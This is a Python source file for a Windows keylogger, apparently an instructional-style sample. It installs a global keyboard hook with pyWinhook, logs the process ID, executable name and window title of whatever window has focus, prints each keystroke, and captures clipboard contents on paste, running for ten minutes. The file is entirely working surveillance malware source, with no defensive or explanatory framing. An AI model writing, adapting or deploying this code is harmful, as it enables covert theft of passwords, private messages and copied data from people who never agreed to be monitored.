from ctypes import byref, create_string_buffer, c_ulong, windll

import pythoncom
import pyWinhook as pyHook
import time
import win32clipboard

TIMEOUT = 60 * 10

class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self, hwnd):
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = pid.value

        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        process_name = executable.value.decode()

        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            window_title = window_title.value.decode('utf-8')
        except UnicodeDecodeError:
            window_title = "[Error decoding window title]"
        return process_id, process_name, window_title

    def mykeystroke(self, event):
        if event.WindowName != self.current_window:
            self.current_window = event.WindowName
            process_id, process_name, window_title = self.get_current_process(event.Window)
            print(f"{process_id} {process_name} {window_title}")

        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}')
        return True

def run():
    kl = KeyLogger()
    hm = pyHook.HookManager()
    hm.KeyDown = kl.mykeystroke
    hm.HookKeyboard()

    start_time = time.time()

    while time.time() - start_time < TIMEOUT:
        pythoncom.PumpWaitingMessages()
        time.sleep(0.1)
    return "Time out."

if __name__ == '__main__':
    print(run())
    print('done.')
